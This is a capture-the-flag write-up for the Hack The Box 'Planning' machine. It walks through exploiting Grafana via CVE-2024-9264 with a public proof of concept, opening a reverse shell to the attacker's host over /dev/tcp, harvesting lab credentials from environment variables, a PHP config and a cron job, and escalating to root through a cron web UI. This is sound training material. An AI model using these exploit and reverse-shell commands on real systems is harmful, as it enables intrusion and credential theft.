# Planning

## Recon

> **Machine Information**: As is common in real life pentests, you will start the Planning box with credentials for the following account: `admin / 0D5oT70Fq13EvB5r`

::: details nmap_scan.log
```log
Open 10.10.11.68:22
Open 10.10.11.68:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.68

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```
:::

## HTTP (80)

![Writeup.png](/assets/pentest/htb/planning/Writeup.png)

Subdomain enumeration unsuccessful.
```bash
â””â”€$ domain='planning.htb'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fl 1
```

Directory scanning also unsuccessful to discover hidden routes.
```bash
â””â”€$ feroxbuster -u http://planning.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php --thorough -n -D -C 404,403,400 -S 0,34,28036 --dont-scan css,png,jpeg,jpg,gif
301      GET        7l       12w      178c http://planning.htb/img => http://planning.htb/img/
301      GET        7l       12w      178c http://planning.htb/js => http://planning.htb/js/
200      GET      201l      663w    10632c http://planning.htb/contact.php
301      GET        7l       12w      178c http://planning.htb/lib => http://planning.htb/lib/
200      GET      194l      674w    10229c http://planning.htb/course.php
200      GET        1l       38w     2303c http://planning.htb/lib/easing/easing.min.js
200      GET      137l      234w     3338c http://planning.htb/js/main.js
200      GET       11l       56w     2406c http://planning.htb/lib/counterup/counterup.min.js
200      GET        7l      158w     9028c http://planning.htb/lib/waypoints/waypoints.min.js
200      GET      220l      880w    13006c http://planning.htb/detail.php
200      GET      230l      874w    12727c http://planning.htb/about.php
200      GET      420l     1623w    23914c http://planning.htb/index.php
200      GET        7l      279w    42766c http://planning.htb/lib/owlcarousel/owl.carousel.min.js
200      GET      420l     1623w    23914c http://planning.htb/
200      GET      156l      543w     7053c http://planning.htb/enroll.php
```

We are given admin credentials, but no login page!

Most of the application logic was leading to nowhere and POST requests didn't even seem to go through..

Retry subdomain enumeration with bigger wordlist:
```bash
â””â”€$ domain='planning.htb'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -mc all -fl 8
grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 73ms]
```

### Grafana

![Writeup-1.png](/assets/pentest/htb/planning/Writeup-1.png)

### RCE

[Grafana security release: Critical severity fix for CVE-2024-9264](https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/) -> POC [CVE-2024-9264](https://github.com/nollium/CVE-2024-9264)

```bash
â””â”€$ git clone -q https://github.com/nollium/CVE-2024-9264.git
â””â”€$ pip install -r CVE-2024-9264/requirements.txt
â””â”€$ py CVE-2024-9264/CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'id' http://grafana.planning.htb/
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: id
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('id >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
uid=0(root) gid=0(root) groups=0(root)
```

### Reverse Shell

```bash
â””â”€$ py CVE-2024-9264/CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"' http://grafana.planning.htb/
---
â””â”€$ pwncat-cs -lp 4444
[03:28:17] Welcome to pwncat ðŸˆ!                                                          __main__.py:164
[03:35:22] received connection from 10.10.11.68:41634                                          bind.py:84
[03:35:24] 10.10.11.68:41634: registered new host w/ db                                    manager.py:957
(local) pwncat$
(remote) root@7ce659d667d7:/usr/share/grafana# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
(remote) root@7ce659d667d7:/usr/share/grafana# find . -type f -ls | grep -v public
   136005   3216 -rw-r--r--   1 root     root      3289998 Mar  1 18:01 ./.duckdb/extensions/v1.1.2/linux_amd64_gcc4/shellfs.duckdb_extension
   136007      4 -rw-r--r--   1 root     root          186 Mar  1 18:01 ./.duckdb/extensions/v1.1.2/linux_amd64_gcc4/shellfs.duckdb_extension.info
   152938     36 -rw-r--r--   1 root     root        34523 May 14  2024 ./LICENSE
   144201 211396 -rwxr-xr-x   1 root     root     216461760 May 14  2024 ./bin/grafana
   144202   1808 -rwxr-xr-x   1 root     root       1848536 May 14  2024 ./bin/grafana-cli
   144203   1808 -rwxr-xr-x   1 root     root       1848536 May 14  2024 ./bin/grafana-server
   144120     72 -rw-r--r--   1 root     root         71835 May 14  2024 ./conf/defaults.ini
   144122      4 -rw-r--r--   1 root     root          1045 May 14  2024 ./conf/ldap_multiple.toml
   144121      4 -rw-r--r--   1 root     root          2986 May 14  2024 ./conf/ldap.toml
   144125      4 -rw-r--r--   1 root     root          2737 May 14  2024 ./conf/provisioning/access-control/sample.yaml
   144127     12 -rw-r--r--   1 root     root         10189 May 14  2024 ./conf/provisioning/alerting/sample.yaml
   144131      4 -rw-r--r--   1 root     root          2648 May 14  2024 ./conf/provisioning/datasources/sample.yaml
   144129      4 -rw-r--r--   1 root     root           185 May 14  2024 ./conf/provisioning/dashboards/sample.yaml
   144133      4 -rw-r--r--   1 root     root           219 May 14  2024 ./conf/provisioning/plugins/sample.yaml
   144134     68 -rw-r--r--   1 root     root         67063 May 14  2024 ./conf/sample.ini
```

```bash
(remote) root@7ce659d667d7:/# cat run.sh
... # Contains many environment variables
(remote) root@7ce659d667d7:/# printenv | grep '^GF'
GF_PATHS_HOME=/usr/share/grafana
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
```

> Creds: `enzo:RioTecRANDEntANT!`

## SSH

```bash
â””â”€$ sshpass -p 'RioTecRANDEntANT!' ssh enzo@planning.htb
enzo@planning:~$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
```

### User.txt

```bash
enzo@planning:~$ cat user.txt
11952756342d32b1ac4c4c71316bdac6
```

## Privilege Escalation

No sudo or suid
```
enzo@planning:~$ sudo -l
Sorry, user enzo may not run sudo on planning.
enzo@planning:~$ find / -perm -4000 2>/dev/null
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/gpasswd
```

Different application seem to be running
```bash
enzo@planning:~$ ss -tunlp4
Netid    State     Recv-Q    Send-Q         Local Address:Port          Peer Address:Port    Process
udp      UNCONN    0         0                 127.0.0.54:53                 0.0.0.0:*
udp      UNCONN    0         0              127.0.0.53%lo:53                 0.0.0.0:*
tcp      LISTEN    0         4096           127.0.0.53%lo:53                 0.0.0.0:*
tcp      LISTEN    0         511                  0.0.0.0:80                 0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:3000               0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:44953              0.0.0.0:*
tcp      LISTEN    0         511                127.0.0.1:8000               0.0.0.0:*
tcp      LISTEN    0         151                127.0.0.1:3306               0.0.0.0:*
tcp      LISTEN    0         70                 127.0.0.1:33060              0.0.0.0:*
tcp      LISTEN    0         4096              127.0.0.54:53                 0.0.0.0:*
```

### MySQL

```bash
enzo@planning:/var/www/web$ find -name '*.php' -ls
   264265      4 -rwxrw-r--   1 www-data www-data       82 Feb 28 20:19 ./lib/waypoints/links.php
   264398     12 -rwxrw-r--   1 www-data www-data    10229 Apr  3 12:38 ./course.php
   264161     16 -rwxrw-r--   1 www-data www-data    13006 Apr  3 12:42 ./detail.php
   264241      8 -rwxrw-r--   1 www-data www-data     7892 Apr  3 12:47 ./enroll.php
   264399     28 -rwxrw-r--   1 www-data www-data    24881 Apr  3 12:35 ./index.php
   264295     16 -rwxrw-r--   1 www-data www-data    12727 Apr  3 12:37 ./about.php
   264400     12 -rwxrw-r--   1 www-data www-data    10632 Apr  3 12:39 ./contact.php
enzo@planning:/var/www/web$ grep mysqli *.php
enroll.php:$conn = new mysqli($servername, $username, $password, $dbname);
index.php:$conn = new mysqli($servername, $username, $password, $dbname);
enzo@planning:/var/www/web$ grep -E '^\$(servername|username|password|dbname)' enroll.php
$servername = "localhost";
$username = "root";
$password = "EXTRapHY";
$dbname = "edukate";
```

> Creds: `root:EXTRapHY`

File read returns NULL meaning we don't have that permission. Check your permissions with GRANTS.
```bash
enzo@planning:/var/www/web$ mysql -u'root' -p'EXTRapHY' -D 'edukate' -e 'SELECT LOAD_FILE("/etc/passwd") \G'
*************************** 1. row ***************************
LOAD_FILE("/etc/passwd"): NULL

enzo@planning:/var/www/web$ mysql -u'root' -p'EXTRapHY' -D 'edukate' -e 'SHOW GRANTS FOR CURRENT_USER() \G'
*************************** 1. row ***************************
Grants for root@localhost: GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER, CREATE TABLESPACE, CREATE ROLE, DROP ROLE ON *.* TO `root`@`localhost` WITH GRANT OPTION
*************************** 2. row ***************************
Grants for root@localhost: GRANT APPLICATION_PASSWORD_ADMIN,AUDIT_ABORT_EXEMPT,AUDIT_ADMIN,AUTHENTICATION_POLICY_ADMIN,BACKUP_ADMIN,BINLOG_ADMIN,BINLOG_ENCRYPTION_ADMIN,CLONE_ADMIN,CONNECTION_ADMIN,ENCRYPTION_KEY_ADMIN,FIREWALL_EXEMPT,FLUSH_OPTIMIZER_COSTS,FLUSH_STATUS,FLUSH_TABLES,FLUSH_USER_RESOURCES,GROUP_REPLICATION_ADMIN,GROUP_REPLICATION_STREAM,INNODB_REDO_LOG_ARCHIVE,INNODB_REDO_LOG_ENABLE,PASSWORDLESS_USER_ADMIN,PERSIST_RO_VARIABLES_ADMIN,REPLICATION_APPLIER,REPLICATION_SLAVE_ADMIN,RESOURCE_GROUP_ADMIN,RESOURCE_GROUP_USER,ROLE_ADMIN,SENSITIVE_VARIABLES_OBSERVER,SERVICE_CONNECTION_ADMIN,SESSION_VARIABLES_ADMIN,SET_USER_ID,SHOW_ROUTINE,SYSTEM_USER,SYSTEM_VARIABLES_ADMIN,TABLE_ENCRYPTION_ADMIN,TELEMETRY_LOG_ADMIN,XA_RECOVER_ADMIN ON *.* TO `root`@`localhost` WITH GRANT OPTION
*************************** 3. row ***************************
Grants for root@localhost: GRANT PROXY ON ``@`` TO `root`@`localhost` WITH GRANT OPTION
```

We have `FILE` privs which should allow reading the files. But `secure_file_priv` is set so we can't go outside it.

```bash
enzo@planning:/var/www/web$ mysql -u'root' -p'EXTRapHY' -D 'edukate' -e 'SHOW VARIABLES LIKE "secure_file_priv" \G'
*************************** 1. row ***************************
Variable_name: secure_file_priv
        Value: /var/lib/mysql-files/
```

### Crontabs

There are some files related to cronjobs.
```bash
enzo@planning:/opt/crontabs$ ls -alh
total 16K
drwxr-xr-x 2 root root 4.0K Jul  3 04:19  .
drwxr-xr-x 4 root root 4.0K Feb 28 19:21  ..
-rw-r--r-- 1 root root  737 Jul  3 04:19 'backup Thu Jul 03 2025 04:19:24 GMT 0000 (Coordinated Universal Time).db'
-rw-r--r-- 1 root root  737 Jul  3 08:12  crontab.db
enzo@planning:/opt/crontabs$ cat crontab.db  | jq
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```

Port forward unknown applcations for closer inspection:
```bash
â””â”€$ sshpass -p 'RioTecRANDEntANT!' ssh enzo@planning.htb -L 44953:0:44953 -L 8000:0:8000
```

8000 needed Basic Auth, after some tries I got in.

> Creds: `root:P4ssw0rdS0pRi0T3c`

![Writeup-2.png](/assets/pentest/htb/planning/Writeup-2.png)

Add new job and run it

![Writeup-3.png](/assets/pentest/htb/planning/Writeup-3.png)

```bash
enzo@planning:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
```

### Root.txt

```
rootbash-5.2# cat /root/root.txt
443a2d44d50e3968b48cf6aab492f1c8
```
